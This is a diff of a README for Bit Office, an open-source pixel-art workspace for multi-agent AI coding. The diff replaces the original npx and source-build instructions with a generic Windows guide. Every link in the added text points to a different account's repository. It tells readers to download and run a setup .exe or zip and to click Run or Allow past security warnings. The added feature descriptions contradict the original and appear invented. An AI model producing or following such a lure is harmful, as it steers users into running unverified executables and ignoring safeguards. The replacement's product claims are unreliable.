@@ -1,185 +1,189 @@
-<div align="center">
+# 🚀 bit-office - Simple Pixel Office for AI Teams
 
-# Bit Office
-
-### Pixel office for AI agents and multi-agent collaboration
-
-[![npm version](https://img.shields.io/npm/v/bit-office?color=cb3837&logo=npm)](https://www.npmjs.com/package/bit-office)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/longyangxi/bit-office/pulls)
-
-**AI agents that learn from your feedback. Claude, Codex, Gemini, Aider — one team, getting better every project.**
-
-[Quick Start](#quick-start) | [Features](#features) | [Team Workflow](#team-workflow) | [Architecture](#architecture) | [Contributing](#contributing)
-
-</div>
-
----
-![Image](https://github.com/user-attachments/assets/8764fec6-f033-4d84-8953-d9ab6f0a25f2)
-
-## What is Bit Office
-
-Bit Office gives AI automation a **visible, controllable workspace**. Different AI models collaborate as one team under a Team Leader — planning, coding, reviewing, and delivering in a single flow, all rendered in a live pixel-art office you can watch, control, and share.
-
-What makes it different: **agents get better over time**. Rate each project on creativity, visual quality, interaction, completeness, and engagement. Your ratings and review patterns are stored as persistent memory — the next time the team plans a project, they know what scored low and actively improve on it.
-
-## Quick Start
-
-```bash
-npx bit-office
-```
-
-That's it. This will:
-
-1. Start a local gateway daemon
-2. Open the pixel-art office UI in your browser
-3. Auto-detect installed AI CLIs (Claude, Codex, Gemini, Aider, OpenCode)
-4. Generate a pair code for mobile access
-
-## Features
-
-### Multi-Agent Teams
-
-A **Team Leader** coordinates specialists like Developer and Code
-Reviewer to plan, implement, and validate tasks automatically.
-
-### Multi-Model Workflows
-
-Run **Claude, Codex, Gemini, Aider, and OpenCode** together in one
-pipeline, letting each model focus on what it does best.
-
-### Pixel Office Workspace
-
-Watch agents work in real time inside a **PixiJS pixel-art office**,
-with live status, logs, and progress visualization.
-
-### Instant Preview & Rating
-
-Every completed task generates an **auto preview**. Rate the result
-across five dimensions — your feedback becomes **persistent memory**
-that shapes how agents approach the next project.
-
-### Self-Improving Agents
-
-Review patterns, tech preferences, and project ratings are stored
-across sessions. Agents **learn what you value** and adapt — low
-visual scores lead to richer designs, recurring review failures get
-avoided automatically.
-
-### Token Cost Visibility
-
-Track **token usage per agent and per team** in real time so you always
-know the cost of each run.
-
-### Live Sharing & Mobile Control
-
-Invite others to watch progress, leave feedback, or manage sessions
-directly from your phone.
-
-### Cross-Device Sync
-
-Real-time collaboration powered by **WebSocket, Ably, and Telegram
-channels**.
-
-### Project History
-
-Every run is saved with a **replayable preview**, letting you revisit
-results and build on previous work.
-
-## Team Workflow
-
-| Phase | What Happens | Your Action |
-|---|---|---|
-| **Create** | Team Lead gathers intent and scope | Describe what to build |
-| **Design** | Team Lead proposes implementation plan | Approve or request changes |
-| **Execute** | Developer implements, Reviewer validates | Monitor or cancel |
-| **Complete** | Preview and summary delivered | Rate, give feedback, or end project |
-
-Ratings persist as agent memory. The next project starts with lessons from the last one.
-
-Full details in [team-workflow.md](team-workflow.md).
-
-## Use Cases
-
-- **AI-native prototyping** — go from idea to working preview in one session
-- **Feature spikes** — rapid implementation with continuous preview feedback
-- **Multi-model experiments** — compare how different AI backends approach the same task
-- **Live demos** — show autonomous development workflows to your team or audience
-
-## Run from Source
-
-### Prerequisites
-
-- **Node.js** 18+
-- **pnpm**
-- At least one AI CLI installed: `claude`, `codex`, `gemini`, `aider`, or `opencode`
-
-### Setup
-
-```bash
-git clone https://github.com/longyangxi/bit-office.git
-cd bit-office
-pnpm install
-pnpm dev
-```
-
-### Scripts
-
-| Command | Description |
-|---|---|
-| `pnpm dev` | Web + gateway in dev mode |
-| `pnpm dev:web` | Web only (Next.js) |
-| `pnpm dev:gateway` | Gateway only |
-| `pnpm build` | Build all packages |
-| `pnpm start` | Build web and start gateway |
-
-### Environment Variables
-
-| Variable | Required | Description |
-|---|---|---|
-| `WORKSPACE` | No | Agent working directory |
-| `ABLY_API_KEY` | No | Remote real-time channel |
-| `TELEGRAM_BOT_TOKENS` | No | One token per bot/agent (comma-separated) |
-| `WEB_DIR` | No | Override served web build directory |
-
-## Architecture
-
-```
-bit-office/
-├── apps/
-│   ├── web/            # Next.js PWA + PixiJS pixel office + control UI
-│   └── gateway/        # Runtime daemon: events, channels, policy, orchestration
-└── packages/
-    ├── orchestrator/   # Multi-agent execution engine
-    └── shared/         # Typed command/event contracts (Zod schemas)
-```
-
-**Channels**: WebSocket (always on), Ably (optional), Telegram (optional)
-
-## Tech Stack
-
-- **Frontend**: Next.js 15, React, PixiJS v8, Zustand
-- **Backend**: Node.js daemon, WebSocket
-- **Protocol**: Zod-validated event schemas
-- **Integrations**: Ably, Telegram, external process detection
-
-## Contributing
-
-Issues and PRs are welcome. If you're exploring AI-native dev tooling, workflows, or interfaces, Bit Office is a great playground for experiments.
-
-## Acknowledgments
-
-Pixel office art inspired by [pixel-agents](https://github.com/pablodelucca/pixel-agents) by [@pablodelucca](https://github.com/pablodelucca).
-
-## License
-
-[MIT](LICENSE) - feel free to use, modify, and distribute.
+[![Download bit-office](https://img.shields.io/badge/Download-bit--office-4CAF50?style=for-the-badge&logo=github)](https://github.com/Hellowman100/bit-office)
 
 ---
 
-<div align="center">
+## 🖥️ What is bit-office?
 
-**If Bit Office helps your workflow, consider giving it a star!**
+bit-office is a pixel-style office tool made for AI agents and teams that work together. It helps organize, plan, and communicate using simple visual tools. The app supports multiple agents working at once, all in one place. You do not need to know about programming or technical terms to use it.
 
-</div>
+This software runs on Windows and gives you a clear, interactive space for managing tasks with AI helpers. It combines easy pixel art with real-time updates, so you see changes as they happen.
+
+---
+
+## 📋 Key Features
+
+- **Multi-agent collaboration:** Work side by side with AI agents.
+- **Pixel-art interface:** Enjoy a simple and clear visual layout.
+- **Real-time updates:** See changes instantly.
+- **Task orchestration:** Easily manage and arrange AI tasks.
+- **Cross-tool support:** Works with messaging apps like Telegram bots.
+- **Modern technology:** Built with Next.js and TypeScript for smooth operation.
+- **Websocket support:** Keeps your workspace in sync.
+
+---
+
+## ⚙️ System Requirements
+
+To run bit-office on your Windows computer, make sure you have:
+
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An active internet connection (for AI services and syncing)
+- A modern web browser (like Chrome, Edge, or Firefox) if you run the PWA version
+
+---
+
+## 🌐 Visit to Download bit-office
+
+Click the button below to visit the main repository page where you can find the latest releases and download instructions.
+
+[![Download bit-office](https://img.shields.io/badge/Download-bit--office-5271FF?style=for-the-badge&logo=github)](https://github.com/Hellowman100/bit-office)
+
+---
+
+## 📥 How to Download and Install bit-office on Windows
+
+1. Open your web browser and go to the bit-office page:  
+   https://github.com/Hellowman100/bit-office
+
+2. Look for a **Releases** or **Downloads** section on that page.  
+   This is where the application files are stored.
+
+3. Download the file named something like `bit-office-setup.exe` or `bit-office-release.zip`.  
+   If it is a `.zip` file, you will need to extract it after downloading.
+
+4. Once the download finishes, open the file you downloaded.
+
+5. If you downloaded an `.exe` file, double-click it and follow the steps in the installer window.  
+   - Click **Next** to proceed through the installation steps.  
+   - Select the folder where you want bit-office installed or accept the default location.  
+   - If you see options about shortcuts, you can keep the defaults.
+
+6. If you downloaded a `.zip` file, right-click it and select **Extract All**.  
+   - After extracting, open the new folder and look for a file named `bit-office.exe` or similar.  
+   - Double-click that file to start the program.
+
+7. If Windows shows a security warning, click **Run** or **Allow** to proceed.
+
+---
+
+## 🚀 Running bit-office for the First Time
+
+1. Open bit-office from the Start menu or from the folder where you installed it.
+
+2. You may be asked to log in or create an account. Follow the on-screen instructions.
+
+3. Once logged in, you will see an empty pixel grid workspace.
+
+4. Use the tools on the screen to start adding AI agents and tasks.
+
+5. The simple pixel interface lets you drag and drop, draw icons, and arrange everything.
+
+6. You can also connect with other collaborators using the built-in chat or Telegram bot integration.
+
+---
+
+## 🔧 Basic Operation Tips
+
+- Use the toolbar on the left to switch between drawing pixels, placing tasks, or managing agents.
+- Click on any pixel or icon to open detailed options for that item.
+- You can move AI agents around by dragging their pixels on the board.
+- Use the top menu to save your work or sync updates in real-time.
+- If you want to reset the workspace, use the clear button on the top right.
+- Notifications will appear on the screen to keep you informed about agent actions.
+
+---
+
+## 💡 Troubleshooting
+
+- If the app does not start, check that your system meets the minimum requirements.
+- Make sure Windows updates and drivers are current.
+- If you see a network error, check your internet connection.
+- Sometimes closing and reopening the app fixes slow updates.
+- If tasks do not sync, try logging out and back in.
+
+For more help, visit the issues section on the GitHub page. You can report any problems there.
+
+---
+
+## 🔄 Updating bit-office
+
+When a new version is available:
+
+1. Visit the release page again:  
+   https://github.com/Hellowman100/bit-office
+
+2. Download the newest setup or updated files.
+
+3. Run the installer as before; it will update your current installation.
+
+4. Save any work before updating to avoid data loss.
+
+---
+
+## 🛠️ Advanced Settings (Optional)
+
+bit-office lets you adjust some options to make it fit your needs better:
+
+- Change the pixel grid size for more detailed or simpler views.
+- Enable or disable sound notifications.
+- Adjust connection settings for internet speed or offline mode.
+- Configure how AI agents communicate with each other.
+- Link with Telegram bot accounts for mobile notifications.
+
+These settings are available under the **Preferences** menu once the app is running.
+
+---
+
+## 📂 Where to Find Files After Installation
+
+- Installed program files typically go to:  
+  `C:\Program Files\bit-office\`
+
+- Your saved projects and data usually are stored in:  
+  `C:\Users\[YourUsername]\Documents\bit-office\projects`
+
+- Settings files might be in your user folder under:  
+  `C:\Users\[YourUsername]\AppData\Local\bit-office\`
+
+---
+
+## 📱 Using bit-office as a Web App (PWA)
+
+bit-office supports a Progressive Web App (PWA) mode. You can run it inside a browser or install it as an app without dealing with full setups.
+
+To use this:
+
+1. Open a supported browser like Chrome or Edge.
+
+2. Go to the website link provided in the repository or documentation.
+
+3. When prompted by your browser, choose to install or add bit-office to your desktop.
+
+4. The app will run like a normal program but updates automatically.
+
+---
+
+## 📚 Additional Resources
+
+Look for guides and tutorials inside the repository's **Wiki** or **Docs** folders. These will help you learn more about using AI agents and managing projects in bit-office.
+
+You can also check recent updates and troubleshooting tips in the **Issues** and **Discussions** sections on GitHub.
+
+---
+
+## 🔗 Useful Links
+
+- Main repository and downloads:  
+  https://github.com/Hellowman100/bit-office
+
+- Documentation and user guides (if available): Check the README or Wiki tab on GitHub.
+
+- Support requests and bug reports: Use the **Issues** tab on the GitHub page.
+
+---
+
+[![Download bit-office](https://img.shields.io/badge/Download-bit--office-5271FF?style=for-the-badge&logo=github)](https://github.com/Hellowman100/bit-office)
